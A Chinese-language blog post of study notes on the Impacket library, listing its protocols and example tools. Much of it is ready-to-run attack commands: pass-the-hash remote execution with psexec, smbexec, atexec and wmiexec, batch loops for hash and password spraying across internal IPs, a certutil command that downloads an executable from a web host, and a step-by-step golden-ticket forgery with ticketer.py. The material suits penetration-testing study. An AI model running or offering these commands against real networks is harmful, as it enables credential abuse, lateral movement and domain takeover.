# Impacket库学习




## 简介

Impacket是用于处理网络协议的Python类的集合。Impacket专注于提供对数据包的简单编程访问，以及协议实现本身的某些协议（例如SMB1-3和MSRPC）。数据包可以从头开始构建，也可以从原始数据中解析，而面向对象的API使处理协议的深层次结构变得简单。该库提供了一组工具，作为在此库找到可以执行的操作的示例。



## 安装

```bash
pip install impacket  # 这只会安装这个库，但是不能安装使用的其他库和例子
```

**首先我们要先去GitHub下载源码，或者直接使用**

```
git clone https://github.com/CoreSecurity/impacket.git
```

**然后解压缩，进入impacket**

```
cd impacket/
```

**然后运行**

```
python setup.py install
```

**工具都在这个目录里impacket/examples**

```
cd impacket/examples
```



**Docker：**

Build Impacket's image:

```
$ docker build -t "impacket:latest" .
```

Using Impacket's image:

```
$ docker run -it --rm "impacket:latest"
```



## 包含的协议

- 以太网，Linux“Cooked”数据包捕获
- IP，TCP，UDP，ICMP，IGMP，ARP
- 支持IPv4和IPv6
- NMB和SMB1，SMB2和SMB3（高级实现）
- MSRPC版本5，通过不同的传输协议：TCP，SMB / TCP，SMB/NetBIOS和HTTP
- 使用密码/哈希/票据/密钥进行简单的NTLM和Kerberos身份验证
- 部分或完全实现以下MSRPC接口：EPM，DTYPES，LSAD，LSAT，NRPC，RRP，SAMR，SRVS，WKST，SCMR，BKRP，DHCPM，EVEN6，MGMT，SASEC，TSCH，DCOM，WMI
- 部分TDS（MSSQL）和LDAP协议实现。







## 包含的工具

![查看](https://image.geoer.cn/2022-05-09-113402.png)



### 远程执行

- psexec.py:类似PSEXEC的功能示例，使用remcomsvc（https://github.com/kavika13/remcom）Psexec.py允许你在远程Windows系统上执行进程，复制文件，并返回处理输出结果。此外，它还允许你直接使用完整的交互式控制台执行远程shell命令（不需要安装任何客户端软件）。

  ```bash
  # 语法: ./psexec.py [[domain/] username [: password] @] [Target IP Address]
  ./psexec.py SERVER/Administrator: T00r@192.168.1.140
  
  
  /psexec.py -hashes :7ce21f17c0aee7fb9ceba532d0546ad6 test/administrator@172.16.99.146
  
  ./psexec.py -hashes :7ce21f17c0aee7fb9ceba532d0546ad6 test/administrator@192.168.124.136 -c /root/1.exe
  
  ```

  

- smbexec.py：与使用remcomsvc的psexec w/o类似的方法。这里描述了该技术。我们的实现更进一步，实例化本地smbserver以接收命令的输出。这在目标计算机没有可写共享可用的情况下很有用。

  ```bash
  # smbexec
  ./smbexec.py test/administrator@192.168.23.99 -hashes aad3b435b51404eeaad3b435b51404ee:3dbde697d71690a769204beb12283678 #左面是lm-hash，右边是nt-hash，lmhash可以为空
  
  ./smbexec.py -hashes :3dbde697d71690a769204beb12283678 test/administrator@192.168.23.99
  
  ./smbexec.py test/administrator:123@192.168.23.99
  
  ```

  

- atexec.py：此示例通过Task Scheduler服务在目标计算机上执行命令，并返回已执行命令的输出。

  ```bash
  ./atexec.py test/administrator:1234@192.168.124.136 “certutil -urlcache -split -f http://192.168.124.136/1.exe 2.exe”
  
  ./atexec.py -hashes :7ce21f17c0aee7fb9ceba532d0546ad6 test/administrator@192.168.124.136 1.exe
  
  ## hash喷洒攻击
  # 内网机器遍历做hash传递验证,ips.txt内容为内网ip，每段一条
  FOR /F %i in (ips.txt) do atexec.exe -hashes :3dbde697d71690a769204beb12283678 ./administrator@%i whoami
  
  # 指定主机ntlm hash遍历验证，hashes.txt为已知ntlm hash内容，每段一条
  #文件内部的hash格式应该为":nthash"或者"lmhash:nthash",如果只采用nthash切记加一个冒号":"
  FOR /F %i in (hashes.txt) do atexec.exe -hashes %i ./administrator@192.168.23.99 whoami
  
  # 内网机器遍历做密码验证，passwords.txt为已知密码内容，每段一条
  FOR /F %i in (passwords.txt) do atexec.exe ./administrator:%i@192.168.23.99 whoami
  
  # 指定主机密码遍历验证,ips.txt内容为内网ip，每段一条
  FOR /F %i in (ips.txt) do atexec.exe ./administrator:123@%i whoami
  ```

  

- wmiexec.py：通过Windows Management Instrumentation使用的半交互式shell，它不需要在目标服务器上安装任何服务/代理，以管理员身份运行，非常隐蔽。

  ```bash
  # 语法: ./wmiexec.py [[domain/] username [: password] @] [Target IP Address]
  ./wmiexec.py SERVER/Administrator: T00r@192.168.1.140
  
  
  ./wmiexec.py -hashes :7ce21f17c0aee7fb9ceba532d0546ad6 test/administrator@172.16.99.146
  
  ```

  

- dcomexec.py：类似于wmiexec.py的半交互式shell，但使用不同的DCOM端点。目前支持MMC20.Application，ShellWindows和ShellBrowserWindow对象。

- GetTGT.py：指定密码，哈希或aesKey，此脚本将请求TGT并将其保存为ccache

- GetST.py：指定ccache中的密码，哈希，aesKey或TGT，此脚本将请求服务票证并将其保存为ccache。如果该帐户具有约束委派（具有协议转换）权限，您将能够使用-impersonate参数代表另一个用户请求该票证。

  ```bash
  python3 getST.py -dc-ip 172.24.1.99 -spn krbtgt/test.com@test.com test/zhujiayu:123
  
  ```

  

- GetPac.py：此脚本将获得指定目标用户的PAC（权限属性证书）结构，该结构仅具有正常的经过身份验证的用户凭据。它通过混合使用[MS-SFU]的S4USelf +用户到用户Kerberos身份验证组合来实现的。

- GetUserSPNs.py：此示例将尝试查找和获取与普通用户帐户关联的服务主体名称。

- GetNPUsers.py：此示例将尝试为那些设置了属性“不需要Kerberos预身份验证”的用户获取TGT（UF_DONT_REQUIRE_PREAUTH).输出与JTR兼容

- ticketer.py：此脚本将从头开始或基于模板（根据KDC的合法请求）创建金/银票据，允许您在PAC_LOGON_INFO结构中自定义设置的一些参数，特别是组、外接程序、持续时间等。

- raiseChild.py：此脚本通过（ab）使用Golden Tickets和ExtraSids的基础来实现子域到林权限的升级。









### Kerberos

- secretsdump.py：执行各种技术从远程机器转储Secrets，而不在那里执行任何代理。对于SAM和LSA Secrets（包括缓存的凭据），然后将hives保存在目标系统（％SYSTEMROOT％\ Temp目录）中，并从中读取其余数据。对于DIT文件，我们使用dl_drsgetncchanges（）方法转储NTLM哈希值、纯文本凭据（如果可用）和Kerberos密钥。它还可以通过使用smbexec/wmiexec方法执行的vssadmin来转储NTDS.dit.如果脚本不可用，脚本将启动其运行所需的服务（例如，远程注册表，即使它已被禁用）。运行完成后，将恢复到原始状态。
- mimikatz.py：用于控制@gentilkiwi开发的远程mimikatz RPC服务器的迷你shell



### Windows密码

- ntlmrelayx.py：此脚本执行NTLM中继攻击，设置SMB和HTTP服务器并将凭据中继到许多不同的协议（SMB，HTTP，MSSQL，LDAP，IMAP，POP3等）。该脚本可以与预定义的攻击一起使用，这些攻击可以在中继连接时触发（例如，通过LDAP创建用户），也可以在SOCKS模式下执行。在此模式下，对于每个中继的连接，稍后可以通过SOCKS代理多次使用它
- karmaSMB.py：无论指定的SMB共享和路径名如何，都会响应特定文件内容的SMB服务器
- smbserver.py:SMB服务器的Python实现，允许快速设置共享和用户帐户。



### 服务器工具/ MiTM攻击

- ntlmrelayx.py：此脚本执行NTLM中继攻击，设置SMB和HTTP服务器并将凭据中继到许多不同的协议（SMB，HTTP，MSSQL，LDAP，IMAP，POP3等）。该脚本可以与预定义的攻击一起使用，这些攻击可以在中继连接时触发（例如，通过LDAP创建用户），也可以在SOCKS模式下执行。在此模式下，对于每个中继的连接，稍后可以通过SOCKS代理多次使用它
- karmaSMB.py：无论指定的SMB共享和路径名如何，都会响应特定文件内容的SMB服务器
- smbserver.py:SMB服务器的Python实现，允许快速设置共享和用户帐户。



### WMI

- wmiquery.py：它允许发出WQL查询并在目标系统上获取WMI对象的描述（例如，从win32_account中选择名称）
- wmipersist.py： 此脚本创建/删除wmi事件使用者/筛选器，并在两者之间建立链接，以基于指定的wql筛选器或计时器执行Visual Basic Basic



### 已知的漏洞

- goldenPac.py： 利用MS14-068。保存Golden Ticket并在目标位置启动PSExec会话
- sambaPipe.py：该脚本将利用CVE-2017-7494，通过-so参数上传和执行用户指定的共享库。
- smbrelayx.py：利用SMB中继攻击漏洞CVE-2015-0005。如果目标系统正在执行签名并且提供了计算机帐户，则模块将尝试通过NETLOGON收集SMB会话密钥。 利用SMB中继攻击漏洞CVE-2015-0005

### SMB / MSRPC

- smbclient.py：一个通用的SMB客户端，可以允许您列出共享和文件名，重命名，上传和下载文件，以及创建和删除目录，所有这些都是使用用户名和密码或用户名和哈希组合。这是一个很好的例子，可以了解到如何在实际中使用impacket.smb

- getArch.py：此脚本将与目标（或目标列表）主机连接，并使用文档化的msrpc功能收集由（ab）安装的操作系统体系结构类型。

- rpcdump.py：此脚本将转储目标上注册的RPC端点和字符串绑定列表。它还将尝试将它们与已知端点列表进行匹配。

- ifmap.py：此脚本将绑定到目标的管理接口，以获取接口ID列表。它将在另一个界面UUID列表上使用这个列表，尝试绑定到每个接口并报告接口是否已列出或正在侦听。

- opdump.py：这将绑定到给定的hostname:port和msrpc接口。然后，它尝试依次调用前256个操作号中的每一个，并报告每个调用的结果。

- samrdump.py：从MSRPC套件与安全帐户管理器远程接口通信的应用程序中。它列出了通过此服务导出的系统用户帐户、可用资源共享和其他敏感信息

- services.py：此脚本可用于通过[MS-SCMR] MSRPC接口操作Windows服务。它支持启动，停止，删除，状态，配置，列表，创建和更改。

- netview.py：获取在远程主机上打开的会话列表，并跟踪这些会话在找到的主机上循环，并跟踪从远程服务器登录/退出的用户

- reg.py：通过[ms-rrp]msrpc接口远程注册表操作工具。其想法是提供与reg.exe Windows实用程序类似的功能。

- lookupsid.py：通过[MS-LSAT] MSRPC接口的Windows SID暴力破解程序示例，旨在查找远程用户和组

  ```bash
  # 语法: ./lookupsid.py [[domain/] username [: password] @] [Target IP Address]
  ./lookupsid.py SERVER/Administrator: T00r@192.168.1.140
  
  ```

  

### MSSQL / TDS

- mssqlinstance.py：从目标主机中检索MSSQL实例名称。
- mssqlclient.py：MSSQL客户端，支持SQL和Windows身份验证（哈希）。它还支持TLS。

```bash
# 登录mysql
python mssqlclient.py  domain/user@ip address -windows-auth

#select is_srvrolemember(‘sysadmin’)	判断是否有系统权限
#如果权限够高可以开启xp_cmdshell来执行系统命令

```





### 文件格式

- esentutl.py：Extensibe存储引擎格式实现。它允许转储ESE数据库的目录，页面和表（例如NTDS.dit）
- ntfs-read.py:NTFS格式实现。此脚本提供了一个用于浏览和提取NTFS卷的功能小的反弹shell，包括隐藏/锁定的内容
- registry-read.py：Windwows注册表文件格式实现。它允许解析脱机注册表配置单元

### 其他

- GetADUsers.py：此脚本将收集有关域用户及其相应电子邮件地址的数据。它还将包括有关上次登录和上次密码设置属性的一些额外信息。

- mqtt_check.py：简单的MQTT示例，旨在使用不同的登录选项。可以很容易地转换成帐户/密码暴力工具。

- rdp_check.py：[MS-RDPBCGR ]和[MS-CREDSSP]部分实现只是为了达到CredSSP身份验证。此示例测试帐户在目标主机上是否有效。

- sniff.py：简单的数据包嗅探器，使用pcapy库来监听在指定接口上传输的包。

- sniffer.py：简单的数据包嗅探器，它使用原始套接字来侦听与指定协议相对应的传输中的数据包。

- ping.py：简单的ICMP ping，它使用ICMP echo和echo-reply数据包来检查主机的状态。如果远程主机已启动，则应使用echo-reply数据包响应echo探针。

  ```bash
  Use: ./ping.py <src ip> <dst ip>
  ```

  

- ping6.py：简单的IPv6 ICMP ping，它使用ICMP echo和echo-reply数据包来检查主机的状态。





## 黄金票据的制作

第一步：打开管理员权限的命令行窗口并清空票据

```bash
klist purge
```

第二步：制作ccache文件

```bash
python ticketer.py -nthash d8d2ad72a119a8d418703f7a16580af6 -domain-sid S-1-5-21-3763276348-88739081-2848684050 -domain test.com administrator
```

第三步：更改环境变量

```bash
set KRB5CCNAME=C:\Users\zhangsan\Desktop\impacket-examples-windows-master\administrator.ccache
```

第四步：验证成果

```bash
python wmiexec.py test.com/administrator@yukong -k -no-pass

```



利用impacket来进行票据的制作有一定的局限性，制作完票据后在klist命令下是看不到缓存的。也没办法使用net use \\ip\admin$ 来建立管道连接。但可以使用其自带的工具在在一定的命令格式下进行远控指定主机。命令格式为：

```bash
xxxx.py domain/username@hostname -k -no-pass

```



参考：https://shanfenglan.blog.csdn.net/article/details/108266378













































---

> 作者: [剑胆琴心](http://shuai06.github.io)  
> URL: https://shuai06.github.io/impacket%E5%BA%93%E5%AD%A6%E4%B9%A0/  

